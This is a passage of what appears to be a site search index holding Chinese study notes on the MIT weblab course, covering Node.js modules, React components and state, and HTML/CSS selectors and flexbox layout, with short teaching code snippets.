<p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/Nodejs/","title":"Node.js","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/Nodejs/#nodejs_1","title":"nodejs","text":"<p>\u670d\u52a1\u5668\u662f\u4e00\u4e2a\u673a\u5668\uff0c\u5904\u7406\uff0c\u63a5\u53d7\u6570\u636e\uff0c\u5e76\u4e14\u4e0e\u591a\u4e2a\u5ba2\u6237\u7aef\u8fdb\u884c\u901a\u4fe1</p> <p>\u5f53\u6211\u4eec\u6b63\u5f0f\u4e0e\u670d\u52a1\u7aef\u901a\u4fe1\u65f6\u9700\u8981\u4ee5\u8fd9\u6837\u7684\u683c\u5f0f\uff1a<code>protocol://domain:port</code>\u200b \u534f\u8bae+\u57df\u540d+\u7aef\u53e3</p> <p>\u5f53\u6211\u4eec\u5e73\u65f6\u8bbf\u95ee\u7f51\u7ad9\u7684\u65f6\u5019\u5374\u5f80\u5f80\u4e0d\u9700\u8981\u52a0\u4e0a\u7aef\u53e3\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u7684\u673a\u5668\u5df2\u7ecf\u9884\u7559\u597d\u4e86\u4e00\u7cfb\u5217\u7684\u7aef\u53e3\u6765\u5904\u7406\u4f8b\u5982HTTP\u534f\u8bae</p> <p>\u6211\u4eec\u4e4b\u524d\u8fd0\u884cjs\u4ee3\u7801\u7684\u65f6\u5019\u90fd\u662f\u4f9d\u8d56\u4e8e\u6d4f\u89c8\u5668\uff0c\u800cnode.js\u53ef\u4ee5\u4f7f\u6211\u4eec\u672c\u5730\u7684\u673a\u5668\u8fd0\u884cjs\u4ee3\u7801\uff0c\u5b83\u4f7f\u5f97\u6211\u4eec\u7684\u673a\u5668\u53ef\u4ee5\u8fd0\u884cjs\u4ee3\u7801\uff0c\u4ece\u800c\u8ba9\u6211\u4eec\u7684\u673a\u5668\u4e5f\u53ef\u4ee5\u6210\u4e3a\u4e00\u53f0\u670d\u52a1\u5668</p> <p>npm yarn \u90fd\u662fnode.js\u7684\u5305\u7ba1\u7406\u5de5\u5177</p> <ul> <li>\u6211\u4eec\u4f1a\u628a\u524d\u7aefreact\u7684\u4ee3\u7801\uff0c\u653e\u5728client/</li> <li>\u628a\u670d\u52a1\u7aef\u7684\u4ee3\u7801\u653e\u5728server/</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/Nodejs/#io","title":"\u5f02\u6b65IO","text":"<p>node.js \u662f\u5355\u7ebf\u7a0b\u7684\uff0c\u901a\u8fc7\u4e8b\u4ef6\u961f\u5217\u7684\u5f62\u5f0f\u5b9e\u73b0\u5e76\u53d1\uff0c\u5f53\u7f51\u7edc\u6216\u6587\u4ef6\u8bf7\u6c42\u53d1\u751f\u65f6\uff0cNode.js \u4f1a\u6ce8\u518c\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u7136\u540e\u5c31\u53bb\u5904\u7406\u4e0b\u4e00\u4e2a\u8bf7\u6c42\u4e86\u3002\u5f53\u4e4b\u524d\u7684\u64cd\u4f5c\u5b8c\u6210\u540e\uff0c\u4f1a\u89e6\u53d1\u4e4b\u524d\u6ce8\u518c\u7684\u56de\u8c03\u51fd\u6570\uff0c\u8fdb\u800c\u54cd\u5e94\u4e4b\u524d\u7684\u8bf7\u6c42\u3002\u57fa\u4e8e\u8fd9\u4e2a\u7279\u6027\uff0cnode\u7684\u8bb8\u591a\u64cd\u4f5c\u90fd\u662f\u5f02\u6b65\u7684\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/Nodejs/#js","title":"js\u6a21\u5757\u5316","text":"<p>node.js \u5c06js\u4ee3\u7801\u8fdb\u884c\u4e86\u66f4\u4e25\u683c\u7684\u6a21\u5757\u5316\u5904\u7406\uff0c\u4f7f\u5f97\u5176\u6784\u5efa\u5927\u578b\u9879\u76ee\u6210\u4e3a\u4e86\u53ef\u80fd</p> <p>commonJs</p> <p>\u6211\u4eec\u7684\u4e00\u4e2a\u6587\u4ef6\u4e00\u822c\u90fd\u6709\u5f15\u7528\u548c\u88ab\u5f15\u7528\u90e8\u5206\uff0c\u6211\u4eec\u7528<code>module.exports</code>\u200b\u548c<code>require</code>\u200b\u5206\u522b\u6765\u5904\u7406\u53ef\u88ab\u5f15\u7528\u7684\u63a5\u53e3\u548c\u5f15\u7528\u5176\u4ed6\u6587\u4ef6\u7684\u5de5\u4f5c</p> <p>\u4f8b\u5982</p> <pre><code>// a.js\nvar name = 'morrain'\nvar age = 18\nmodule.exports.name = name\nmodule.exports.getAge = function(){\nreturn age\n}\n//b.js\nvar a = require('./a.js')\nconsole.log(a.name) // 'morrain'\nconsole.log(a.getAge())// 18\n</code></pre> <p>ECMAScript</p> <p>\u73b0\u4ee3\u7248\u672c\u4e2d\u6709\u65b0\u7684\u5904\u7406\u65b9\u5f0f\uff0c\u4f7f\u7528<code>import</code>\u200b\u548c<code>export</code>\u200b\u6765\u5904\u7406</p> <pre><code>import transform from './transform.js' /* default import */\nimport { var1 } from './consts.js' /* import a specific item */\nimport('http://example.com/example-module.js').then(() =&gt; {console.log('loaded')})\nexport const MODE = 'production' /* exported const */\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/Nodejs/#typescript","title":"typescript","text":"<p>js\u662f\u7075\u6d3b\u7684\u52a8\u6001\u8bed\u8a00\uff0c\u8fd9\u4e5f\u5bfc\u81f4\u4e86\u5176\u68c0\u67e5\u975e\u5e38\u4e0d\u4e25\u683c\uff0c\u5bb9\u6613\u51fa\u9519\uff0c\u56e0\u6b64\u6211\u4eec\u6709TypeScript\uff0c\u8ba9js\u7684\u6bcf\u4e00\u4e2a\u53d8\u91cf\u548c\u51fd\u6570\u90fd\u548cC\u7b49\u8bed\u8a00\u4e00\u6837\u6709\u7c7b\u578b\u5b9a\u4e49\u3002</p> <p>TypeScript\u7684\u4f5c\u7528\u662f\u5728\u7f16\u8bd1\u671f\u8fdb\u884c\u7c7b\u578b\u68c0\u67e5\uff0c\u53d1\u73b0\u9519\u8bef\uff0c\u4f46\u6700\u540e\u4f7f\u7528\u7684\u65f6\u5019\u4f9d\u65e7\u4f1a\u8f6c\u6362\u6210js\u4f7f\u7528\uff0c\u5728\u5f00\u53d1\u8f83\u4e3a\u5927\u578b\u7684\u9879\u76ee\u7684\u65f6\u5019\uff0c\u4f7f\u7528typescript\u66ff\u4ee3\u539f\u751fjs\u5f80\u5f80\u662f\u66f4\u597d\u7684\u9009\u62e9</p> <ul> <li>todo</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/react/","title":"react","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/react/#_1","title":"\u8bbe\u8ba1\u601d\u60f3","text":"<p>component</p> <p>react\u7684\u8bbe\u8ba1\u901a\u5e38\u628a\u6574\u4e2awebsite\u770b\u505a\u4e00\u4e2aapp\uff0c\u5176\u672c\u8eab\u662f\u4e00\u7cfb\u5217\u7ec4\u4ef6\u7684\u96c6\u5408\uff0c\u5176\u8bbe\u8ba1\u7684\u6838\u5fc3\u662f\u628a\u4e00\u4e2a\u5927\u7684\u7ec4\u4ef6\u00b7\u5206\u6210\u4e00\u7cfb\u5217\u5c0f\u7684\u7ec4\u4ef6\uff0c\u5982\u6b64\u5212\u5206\u4e0b\u53bb\uff0c\u7ec4\u4ef6\u7684\u5185\u90e8\u9700\u8981\u4e00\u5b9a\u7684\u903b\u8f91\u4e0a\u7684\u8026\u5408\u3002</p> <p>\u5bf9\u4e8e\u6bcf\u4e00\u4e2awebsite\uff0c\u6211\u4eec\u90fd\u53ef\u4ee5\u753b\u51fa\u5b83\u7684\u7ec4\u4ef6\u6811\uff0c\u7ec4\u4ef6\u6811\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e00\u4e2a\u6e05\u6670\u7684\u6d88\u606f\u4f20\u9012\u7684\u65b9\u5411\u3002</p> <p>props \u662f\u6307\u7236\u4eb2\u7ec4\u4ef6\u4f20\u9012\u5411\u5b50\u7ec4\u4ef6\u7684\u6d88\u606f\uff0c\u5bf9\u4e8e\u4efb\u610f\u7684\u5b50\u7ec4\u4ef6\uff0cprops\u662fread-only\u3002(\u65e0\u9700\u66f4\u65b0\u7684\u4fe1\u606f)</p> <p>state \u72b6\u6001\u662f\u6307\u4e00\u4e2a\u7ec4\u4ef6\u5185\u90e8\u79c1\u6709\u7684\u4fe1\u606f\uff0c\u88ab\u8fd9\u4e2a\u7ec4\u4ef6\u72ec\u7acb\u7ef4\u62a4\uff0c\u4f8b\u5982\u4e0b\u56fe\u3002state\u7528\u6765\u5904\u7406\u5bf9\u4e8e\u8fd9\u4e2a\u7ec4\u4ef6\u7684\u8f93\u5165\u4fe1\u606f\uff0c\u800c\u8bbe\u8ba1\u4e0a\u800c\u8a00\uff0c\u7236\u7ec4\u4ef6\u4e0d\u80fd\u83b7\u53d6state\u7684\u4fe1\u606f\u3002react component\u90fd\u9700\u8981\u6709\u4e00\u4e2ainitial function\u6765\u521d\u59cb\u5316state\u3002\uff08\u9700\u8981\u66f4\u65b0\u7684\u4fe1\u606f\uff09</p> <p>\u200b\u200b</p> <p>make states stay and make props pass</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/react/#_2","title":"\u4ee3\u7801\u5b9e\u8df5","text":"<p>tips\uff1a \u5bf9\u4e8ereact\u6765\u8bf4\uff0c\u9700\u8981\u4f7f\u5f97\u751f\u6210\u7684html code\u63a5\u53d7\u5230css\u7684\u6548\u679c\uff0c\u8981\u7528className\u4ee3\u66ffclass</p> <p>\u5bf9\u4e8e\u4e00\u4e2areact component\u6765\u8bf4\uff0c\u9700\u8981</p> <ul> <li>\u4e00\u4e2aconstructor\u6765\u63a5\u53d7props\u5e76\u4e14\u505ainitialize</li> <li>\u4e00\u4e2arender()\u6765\u8fd4\u56deHTML-like code</li> </ul> <p>react\u4e2d\u5c55\u793a\u7a7a\u7528null</p> <p>react\u4f1a\u5728\u66f4\u65b0state\u7684\u65f6\u5019\u81ea\u52a8\u5237\u65b0render(\u5305\u62ec\u6240\u6709\u5b50\u7ec4\u4ef6)\uff0c\u4f46\u662fupdate state\u9700\u8981\u7279\u5b9a\u7684\u505a\u6cd5\uff0c\u9700\u8981\u8c03\u7528setState\u51fd\u6570\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u4f9d\u8d56\u201c=\u201d\u53bb\u4fee\u6539\u6211\u4eec\u7684state\uff0c\u7ed9\u4e2a\u4f8b\u5b50</p> <pre><code>likeComment = () =&gt;{\n    this.setState({\n        isLiked : true,\n    });\n}\n...\nrender(){\n    return(\n        &lt;div ... onClick = {this.likeComment}&gt;  \u4e0d\u9700\u8981\u5728\u8fd9\u91cc\u52a0\u4e0a\u62ec\u53f7\n            {this.props.content}\n            {this.state.isLiked ? &lt;LikeButton/&gt;:null}\n        &lt;/div&gt;\n    );\n}\n</code></pre> <p>\u5982\u4f55\u5728\u7236\u7ec4\u4ef6\u4e2d\u5bfc\u5165\u5b50\u7ec4\u4ef6</p> <ul> <li>\u9996\u5148\u9700\u8981import</li> </ul> <pre><code>import CatHappiness from \"../modules/CatHappiness.js\"\n\u3002\u3002\u3002\u3002\n&lt;CatHappiness catHappiness={catHappiness}/&gt;\n\n\u57fa\u7840\u7684\u683c\u5f0f\u4e3a\n&lt;Component propName={propValue}/&gt;\n</code></pre> <ul> <li>component\u6307\u4ee3\u6211\u4eec\u9700\u8981\u7684\u7ec4\u4ef6\u540d\u79f0\uff0cpropName\u662f\u6307\u6211\u4eec\u9700\u8981\u4f20\u5165\u7684\u4fe1\u606f\u7684\u540d\u79f0\uff0cpropValue\u662f\u6307\u9700\u8981\u4f20\u5165\u7684\u4fe1\u606f\u7684\u503c\u3001</li> </ul> <p>\u51fd\u6570\u7ec4\u4ef6\u548c\u7c7b\u7ec4\u4ef6</p> <p>\u4e00\u4e9b\u7b80\u5355\u7684\u60c5\u51b5\u4e0b\u6211\u4eec\u53ef\u80fd\u53ef\u4ee5\u91c7\u7528\u51fd\u6570\u7ec4\u4ef6\u6765\u8fdb\u884c\u7f16\u5199\uff08\u4e2a\u4eba\u8ba4\u4e3a\u7c7b\u7ec4\u4ef6\u66f4\u52a0\u7b26\u5408\u8bbe\u8ba1\u4e00\u70b9</p> <p>\u4e24\u8005\u529f\u80fd\u662f\u76f8\u540c\u7684\uff0c\u5728\u4f20\u9012props\u7684\u884c\u4e3a\u4e0a\u6709\u4e9b\u8bb8\u4e0d\u540c</p> <p>\u5728\u51fd\u6570\u5f62\u5f0f\u4e2d\u6807\u51c6\u505a\u6cd5\u4f8b\u5b50</p> <pre><code>const [catHappiness, setCatHappiness] = useState(0);  \u521d\u59cb\u5316\u7684\u65f6\u5019\u540c\u65f6\u5b9a\u4e49\u53d8\u91cf\u548c\u5bf9\u5e94\u7684set\u66f4\u65b0\u51fd\u6570\n\n  const incrementCatHappiness = () =&gt; {\n    setCatHappiness(catHappiness + 1);\n  };\n\n&lt;div className=\"Profile-avatarContainer\" onClick={incrementCatHappiness}&gt;\n        &lt;div className=\"Profile-avatar\" /&gt;\n&lt;/div&gt;\n</code></pre> <p>\u4e00\u4e9btips</p> <p>\u5bf9\u4e8e\u9876\u5c42\u7684App.js\u6765\u8bf4\uff0c\u5176\u4e0d\u9700\u8981\u6784\u9020\u51fd\u6570</p> <p>\u5728react\u4e2d\uff0c\u547d\u540d\u89c4\u8303\u5e94\u5f53\u662f\u7c7b\u4f3c\u4e8eNavBar-contianer</p> <p>\u5982\u679c\u4e00\u4e2a\u7ec4\u4ef6\u53ea\u6709render\u51fd\u6570\uff0c\u53ef\u4ee5\u7b80\u5199\u4e3a</p> <pre><code>const Profile = () =&gt; {\n  return (\n    &lt;div&gt;\n      &lt;div className=\"Profile-avatarContainer\"&gt;\n       ...\n    &lt;/div&gt;\n  );\n};\nexport default Profile;\n</code></pre> <p>react\u7684html\u5143\u7d20\u662f\u7ec4\u4ef6\u5316\u7684\uff0c\u4f46\u662fjs\u672c\u8eab\u652f\u6301\u628a\u7b80\u5355\u7684html\u8d4b\u503c\u7ed9js\u53d8\u91cf\uff0c\u56e0\u6b64\u4e00\u4e9b\u7b80\u5355\u7684\u60c5\u51b5\u4e0b\u65e0\u9700\u521b\u5efa\u65b0\u7684\u7ec4\u4ef6</p> <p>\u7ec4\u4ef6\u6302\u8f7d\u548c\u7ec4\u4ef6\u66f4\u65b0</p> <p>\u200d</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/react/#_3","title":"\u5f00\u53d1\u6307\u4ee4","text":"<p>\u5bf9\u4e8ereact\u800c\u8a00\uff0c\u6211\u4eec\u4e0d\u80fd\u7b80\u5355\u5730\u627e\u4e00\u4e2ahtml\u6587\u4ef6\u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00\uff0c\u6211\u4eec\u9700\u8981\u5728\u6587\u4ef6\u76ee\u5f55\u4e0b\u6267\u884c<code>npx webpack</code>\u200b\u6307\u4ee4\uff0c\u5176\u4f1a\u5728/client/dist\u4e0b\u9762\u751f\u4ea7\u4e00\u4e2aindex.html\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00\u5b83\u3002</p> <p>\u4f46\u662f\u95ee\u9898\u5728\u4e8e\u6211\u4eec\u7684\u4fee\u6539\u4e0d\u4f1a\u5b9e\u65f6\u53cd\u5e94\u5728\u8fd9\u4e2aindex.html\u4e0a\uff0c\u4f1a\u4f7f\u5f97\u6211\u4eec\u7684\u5de5\u4f5c\u6d41\u53d8\u7684\u590d\u6742</p> <p>\u5bf9\u6b64\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528<code>npm run hotloader</code>\u200b \u6307\u4ee4\uff0c\u5728\u4e3b\u673a\u7684\u4e00\u4e2a\u7aef\u53e3\u4e0a\u6253\u5f00\u4e00\u4e2a\u5b9e\u65f6\u66f4\u65b0\u7684\u9875\u9762</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/react/#import","title":"\u6587\u4ef6\u7ec4\u7ec7\u548cimport","text":"<p>\u200b\u200b</p> <p>\u57fa\u7840\u7684\u4ee3\u7801\u7ec4\u7ec7\u5982\u4e0a\u56fe\uff0c\u6211\u4eec\u4e3b\u8981\u7f16\u5199\u4ee3\u7801\u90fd\u5728src/\u6587\u4ef6\u5939\u4e2d</p> <ul> <li>public\u6587\u4ef6\u5939\u5185\u7f6e\u5168\u5c40\u4f1a\u7528\u5230\u7684\u4e00\u7cfb\u5217\u8d44\u6e90\uff0c\u6bd4\u5982\u56fe\u7247\u7b49</li> <li>utilities.css \u4e2d\u4e3b\u8981\u5305\u62ec\u5168\u5c40\u4f1a\u7528\u5230\u7684\u4e00\u4e9b\u5178\u578b\u7684css\u6548\u679c\uff0c\u901a\u5e38\u662f\u7b80\u5355\u7684\u548c\u5e38\u7528\u7684\uff0c\u5e76\u4e14\u4e00\u822c\u4f1a\u5305\u62ec\u6240\u6709\u7684css\u53d8\u91cf   utilities.js   \u4e2d\u4e00\u822c\u5305\u62ec\u4e00\u7cfb\u5217js\u51fd\u6570\u6765\u505aAPI request</li> <li>component/\u6587\u4ef6\u5939\u4e2d\u5305\u62ec\u7f51\u9875\u7684\u4e3b\u4f53\u5185\u5bb9\uff0c\u4e00\u822c\u5c31\u662fjs\u6587\u4ef6\u642d\u914d\u5bf9\u5e94\u7684css\u6587\u4ef6</li> <li>modules/\u6587\u4ef6\u5939\u4e2d\u5305\u62ec\u7f51\u9875\u7684\u5177\u4f53\u7684\u7ec4\u6210\u90e8\u5206\uff0c\u4e5f\u5c31\u662freact\u8bbe\u8ba1\u4e2d\u7f51\u9875\u88ab\u62c6\u89e3\u6210\u7684\u5404\u79cd\u7684component   pages/\u6587\u4ef6\u5939\u5305\u62ec\u7f51\u9875\u7684\u5404\u4e2a\u9875\u9762\uff0c\u4e00\u4e2a\u7f51\u9875\u4e0d\u6b62\u4e00\u4e2a\u9875\u9762\uff0c\u4e00\u822c\u6bcf\u4e2a\u9875\u9762\u4f1a\u7ed9\u4e00\u4e2a\u6587\u4ef6\uff0c\u6765\u7ec4\u7ec7modules\u6587\u4ef6\u5939\u4e2d\u7684components</li> <li>\u5728App.js\u4e2d\u7ec4\u7ec7\u6240\u6709\u7684pages</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/","title":"web basic","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#html","title":"html","text":"<p>html\u662f\u63cf\u8ff0\u7f51\u7ad9\u7684\u5185\u5bb9\u7684\uff0c\u662f\u4e00\u79cd\u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00\u3002</p> <p>tips</p> <ul> <li>html\u7684\u8bed\u4e49\u5316\uff0c\u4e0d\u8981\u4f7f\u7528div\u4f5c\u4e3a\u5168\u90e8\u7684\u6a21\u5757\uff0c\u5c3d\u53ef\u80fd\u4f7f\u7528\u5bf9\u5e94\u7684\u8bed\u4e49\u5757</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#css","title":"CSS","text":"<p>css\u662f\u5c42\u53e0\u6837\u5f0f\u8868\uff0ca list of description</p> <p>css\u7684\u57fa\u7840\u5f62\u5f0f</p> <pre><code>selector{\n    //a list of the description like\n    property: value;\n}\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#selector","title":"selector","text":"<p>css\u4e3ahtml\u5143\u7d20\u63d0\u4f9b\u6837\u5f0f\u4fee\u6539\uff0c\u5982\u4f55\u9009\u62e9\u8981\u5f71\u54cd\u7684html\u5c31\u662fselector\u505a\u7684\u4e8b\u60c5</p> <ul> <li>class selector</li> </ul> <pre><code>\u3002classA{\n    color: red;\n}\n&lt;div class = \"classA\" &gt; hello &lt;/div&gt;\n</code></pre> <ul> <li>id selector</li> </ul> <pre><code>#Aid{\n    color: red;\n}\n&lt;div id=\"Aid\" &gt; hello &lt;/div&gt;\n</code></pre> <p>\u4e0a\u8ff0\u4e24\u79cdselector\u7684\u533a\u522b\u5728\u4e8e\uff0c\u4e00\u4e2ahtml\u5143\u7d20\u53ef\u4ee5\u6709\u591a\u4e2aclass\uff0c\u4f46\u662f\u5374\u53ea\u80fd\u6709\u4e00\u4e2aid</p> <pre><code>&lt;div id=\"aaa\"&gt;\n&lt;div class=\"a b c\"&gt;\n</code></pre> <p>\u5728\u4e0a\u8ff0\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u7b2c\u4e8c\u4e2adiv\u540c\u65f6\u5c5e\u4e8ea,b,c\u4e09\u4e2aclass</p> <p>\u540c\u65f6\u6574\u4e2ahtml\u4e2d\u7684id\u5fc5\u987b\u662f\u552f\u4e00\u7684\uff0c\u552f\u4e00\u7684id\u4f5c\u7528\u4e0e\u552f\u4e00\u7684html\u5143\u7d20\uff0c\u4f46\u662f\u540c\u4e00\u4e2aclass\u53ef\u4ee5\u4f5c\u7528\u4e8e\u591a\u4e2a\u5143\u7d20</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#html_1","title":"html\u5143\u7d20","text":"<p>\u5bf9\u4e8ecss\u800c\u8a00\uff0c\u90a3\u4e9b\u7279\u6b8a\u7684\uff0c\u8bed\u4e49\u5316\u7684\u5143\u7d20\u4f8b\u5982h1\u90fd\u662f\u6709\u9ed8\u8ba4\u7684description\u7684\uff1b\u53e6\u5916\u7684\u90a3\u4e9b\u7b80\u5355\u7684\u5143\u7d20\u6bd4\u5982div\u5c31\u53ea\u6709\u7b80\u5355\u7684\u63cf\u8ff0\uff0c\u6bd4\u5982div\u552f\u4e00\u7684\u63cf\u8ff0\u5c31\u662fdisplay: block</p> <p>\u4f46\u662f\u901a\u8fc7css\uff0c\u6211\u4eec\u53ef\u4ee5\u7528selector\u9009\u4e2d\u5e76\u4e14\u8986\u76d6\u4ed6\u4eec\u7684\u9ed8\u8ba4description</p> <p>\u94fe\u63a5html\u548ccss</p> <pre><code>\u5728head\u91cc\u9762\n&lt;link href=\"style.css\"/&gt;\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#css-variables","title":"css variables","text":"<p>\u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e9b\u53d8\u91cf\uff0c\u5e76\u4e14\u5728\u5168\u5c40\u91cc\u53bb\u4f7f\u7528\u5b83\uff0c\u5176\u5b9a\u4e49\u65b9\u5f0f\u5982\u4e0b</p> <pre><code>:root{\n    --primary: #396dff;\n    --grey: #f7f7f7;\n    --white: #fff;\n}\n</code></pre> <p>\u5176\u8c03\u7528\u65b9\u5f0f</p> <pre><code>.navTitle{\n    color: var(--primary);\n}\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#box-model","title":"box model","text":"<p>\u200b\u200b</p> <p>html\u5143\u7d20\u7684\u6574\u4f53\u6837\u5f0f\u662f\u4e00\u4e2abox model</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/MIT%20weblab/web%20basic/#css_1","title":"css\u5e03\u5c40","text":"<p>\u8fd9\u91cc\u4e3b\u8981\u6559\u5b66\u4e86flex\u5e03\u5c40\uff0cflex\u5e03\u5c40\u7684\u4e3b\u8981\u5f62\u5f0f\u662f\u4e00\u5217\u5143\u7d20\uff0c\u8fd9\u4e2a\u4e00\u5217\u662f\u62bd\u8c61\u7684\u8bf4\u6cd5\uff0c\u5b9e\u9645\u4e0a\u53ef\u4ee5\u8bbe\u5b9a\u65b9\u5411</p> <p>A Complete Guide to Flexbox | CSS-Tricks - CSS-Tricks  \u8fd9\u662f\u53c2\u8003\u7684\u94fe\u63a5</p> <pre><code>.container{\n   display: flex;\n}\n</code></pre> <p>\u4e0a\u8ff0\u4ee3\u7801\u4e3a\u57fa\u7840\u7684\u4f7f\u7528\u65b9\u5f0f\uff0c\u4e00\u822c\u5728\u9700\u8981flex\u5e03\u5c40\u7684\u5730\u65b9\u5916\u9762\u5957\u4e00\u4e2adiv\u4f5c\u4e3acontainer\uff0c\u5b9a\u4e49flex\u5e03\u5c40</p> <p>\u63a5\u4e0b\u6765\u6211\u4f1a\u8bb0\u5f55flex\u5e03\u5c40\u4e2d\u4e00\u4e9b\u6700\u57fa\u7840\u7684\u5c5e\u6027\uff0c\u5176\u53ef\u4ee5\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u4e2a\u662f\u4f5c\u4e3acontianer\u7684\u5c5e\u6027\uff0c\u4e00\u4e2a\u662fcontainer\u5185\u90e8\u7684item\u7684\u5c5e\u6027</p> <p>contianer</p> <pre><code>.container {\n    flex-direction: row | row-reverse | column | column-reverse;  \u8fd9\u4e00\u5217\u7684\u65b9\u5411\n    flex-wrap: nowrap | wrap | wrap-reverse;                     \u662f\u5426\u4f1a\u6362\u884c\n\n    flex-flow: column wrap;  \u8fd9\u4e2a\u5c5e\u6027\u662f\u4e0a\u8ff0\u4e24\u4e2a\u5c5e\u6027\u7684\u603b\u548c\u7b80\u5199\u6a21\u5f0f\n}\n</code></pre> <p>items</p> <pre><code>.items{\n    order: 5;  \u7528\u6765\u8c03\u6574item\u5728\u8fd9\u4e00\u5217\u4e2d\u7684\u987a\u5e8f\uff0c\u5982\u679c\u987a\u5e8f\u76f8\u540c\u7684\u8bdd\u5c31\u6309\u5728html\u91cc\u7684\u539f\u987a\u5e8f\u6765\n    flex-grow: 4; /* default 0 */  \u7528\u6765\u8bf4\u660e\u5176\u5728\u8fd9\u4e00\u5217\u4e2d\u6240\u5360\u7684\u6bd4\u4f8b\n    flex-shrink: 3; /* default 1 */ \uff1f\n    flex-basis:  | auto; /* default auto */   \u662f\u7528\u6765\u8bf4\u660eitem\u7684\u57fa\u7840\u5927\u5c0f\uff0c\u53ef\u4ee5\u662f\u6570\u503c\u4e5f\u53ef\u4ee5\u662f\u6bd4\u4f8b\uff0c\u5176\u548cflex-grow\u8054\u52a8\u5373\u53ef\u89e3\u51b3\u5e03\u5c40\u4e2d\u7684\u5927\u591a\u95ee\u9898\n}\n</code></pre> <p>\u4f8b\u5982\u5982\u679c\u9700\u8981\u56db\u4e2a\u5143\u7d20\u6392\u5217\u6210\u56db\u5bab\u683c\uff0c\u9996\u5148flex-wrap\u9009\u62e9wrap\uff0cflex-basis\u900950%,flex-grow\u90091</p> <p>utility class</p> <p>\u901a\u5e38\u6307\u4e00\u4e9b\u5e38\u7528\u7684css\u6807\u5fd7\uff0c\u4f5c\u4e3a\u4e00\u4e2aclass\u5b58\u5728\uff0c\u5e94\u7528\u4e8e\u5f88\u591ahtml\u5143\u7d20</p> <pre><code>.u-textCenter{\n    text-align: center;\n}\n</code></pre> <p>\u7c7b\u4f3c\u4e8e\u4e0a\u8ff0\u8fd9\u79cd\u4f8b\u5b50\uff0c\u5185\u5bb9\u7b80\u5355\u4f46\u662f\u4f1a\u7528\u4e8e\u5f88\u591a\u7684html\u5143\u7d20</p> <p>order</p> <p>css\u5b58\u5728\u4e00\u4e9b\u7279\u6027\uff0c\u4ed6\u4eec\u53ef\u4ee5\u63a5\u53d7\u4e0d\u5b9a\u9879\u4e2a\u6570\u636e\uff0c\u6839\u636e\u8f93\u5165\u7684\u6570\u91cf\u4e0d\u540c\u9002\u7528\u4e8e\u4e0d\u540c\u7684\u89c4\u5219</p> <pre><code>margin: 0;   \u56db\u6761\u8fb9\u90fd\u662f0\nmargin: 10 20 30 40;  \u4e0a\u53f3\u4e0b\u5de6\nmargin: 10 20 30;     \u4e0a\uff08\u5de6\u53f3\uff09\u4e0b\nmargin: 10 20;       \uff08\u4e0a\u4e0b\uff09\uff08\u5de6\u53f3\uff09\n</code></pre> <p>8pt grid system</p> 